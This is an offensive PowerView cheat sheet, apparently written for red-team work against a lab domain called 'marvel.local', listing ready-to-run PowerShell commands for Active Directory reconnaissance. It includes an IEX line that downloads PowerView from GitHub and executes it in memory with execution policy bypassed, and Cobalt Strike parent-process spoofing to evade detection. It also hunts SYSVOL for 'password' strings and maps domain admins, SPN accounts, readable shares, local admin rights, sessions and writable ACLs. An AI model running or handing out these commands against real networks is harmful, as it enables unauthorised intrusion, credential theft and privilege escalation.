## INFO0

### Pre-Commands
```powershell
runas /netonly /user:marvel.local\user1 powershell
powershell -exec bypass
Import-Module .\PowerView.ps1
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1");
```

### Use alternative credential for any function
```powershell
$SecPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('marvel.local\user3', $SecPassword)
Get-DomainUser -Credential $Cred
```

### Search for Interesting Keywords Inside Files on Shares
```powershell
findstr /spin /c:"password" \\hydra-dc\sysvol\*
```

### Cobalt Strike
```powershell
powershell-import /root/PowerView.ps1
ppid 392
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
powerpick Get-Domain
```

## INFO1

### Domain Info
```powershell
Get-Domain
Get-Forest
Get-DomainController
```

### Password Policy
```powershell
Get-DomainPolicy | select -ExpandProperty systemaccess
```

### Enumerate Domain Users
```powershell
Get-DomainUser | select cn,samaccountname,description,pwdlastset,badpwdcount
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
```

### Enumerate Domain Groups
```powershell
Get-DomainGroup *admin* | select cn,samaccountname,description,member,memberof
```

### Enumerate Domain OUs
```powershell
Get-DomainOU | select name,description,whencreated,whenchanged,gplink
```

### Enumerate Domain Computers
```powershell
Get-DomainComputer | select dnshostname,operatingsystem,pwdlastset
```

### Enumerate Domain Group Members
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select groupname,membername,memberobjectclass
```

### Enumerate <User/Group> Groups
```powershell
Get-DomainGroup -MemberIdentity <User/Group> | select samaccountname
```

## INFO2

### Enumerate Open Shares
```powershell
Get-NetShare -ComputerName WorkStation1
```

### Enumerate Open Shares on All Domain Computers (Get-DomainComputer + Get-NetShare)
```powershell
Find-DomainShare -Verbose
```

### Enumerate Open Shares That You Have Read Access
```powershell
Find-DomainShare -CheckShareAccess -Verbose
```

### Search for Interesting Files Inside Shares
```powershell
Find-InterestingFile -Path \\hydra-dc\sysvol\
```

### Find Interesting Domain Share Files (Find-DomainShare + Find-InterestingFile)
```powershell
Find-InterestingDomainShareFile -Verbose
```

## INFO3

### Enumerate Local Groups
```powershell
Get-NetLocalGroup –ComputerName WorkStation1
```

### Enumerate Local Group Members Of Administrators Group on Computer WorkStation1
```powershell
Get-NetLocalGroupMember -ComputerName WorkStation1 -GroupName "Administrators"
Get-NetLocalGroupMember -ComputerName WorkStation1 -GroupName "Remote Desktop Users"
```

### Enumerate Local Group Members on All Domain Computers (Get-DomainComputer + Get-NetLocalGroupMember)
```powershell
Find-DomainLocalGroupMember -GroupName "Administrators" -Verbose
```

### Test Admin Access Rights on a Computer
```powershell
Test-AdminAccess -ComputerName workstation1
```

### Test Admin Access Rights on All Domain Computers (Get-DomainComputer + Test-AdminAccess)
```powershell
Find-LocalAdminAccess -Verbose
```

## INFO4

### Enumerate Users Sessions
```powershell
Get-NetSession -ComputerName WorkStation1
```

### Enumerate LoggedOn Users
```powershell
Get-NetLoggedon -ComputerName workstation1
```

### Get Domain Admins + Run Get-NetSession/Get-NetLoggedon on Every Domain Computer + Comparing The Result
```powershell
Find-DomainUserLocation -Verbose
```

### Perform Against Highly Traffic Servers (Get-DomainFileServer, Get-DomainDFSShare, Get-DomainController)
```powershell
Find-DomainUserLocation -Stealth -Verbose
```

### Run Get-NetSession/Get-NetLoggedon on Every Domain Computer Then Printing All The Result
```powershell
Find-DomainUserLocation -ShowAll
```

### Perform Against Different Users or Groups
```powershell
Find-DomainUserLocation -UserGroupIdentity "local_admin"
Find-DomainUserLocation -UserIdentity "ITSupport"
```

## INFO5

### Enumerate All The Domain ACLs for Non-BuiltIn Users With Modification Access
```powershell
Find-InterestingDomainAcl -ResolveGUIDs -WarningAction:SilentlyContinue | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights,ObjectAceType
```

### Enumerate all the special ACLs
```powershell
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite" -and $_.SecurityIdentifier -match "S-1-5-21-410602843-3916082903-3170366279-[\d]{4,10}" } | select SecurityIdentifier,ObjectDN,ActiveDirectoryRights,ObjectAceType | fl
```
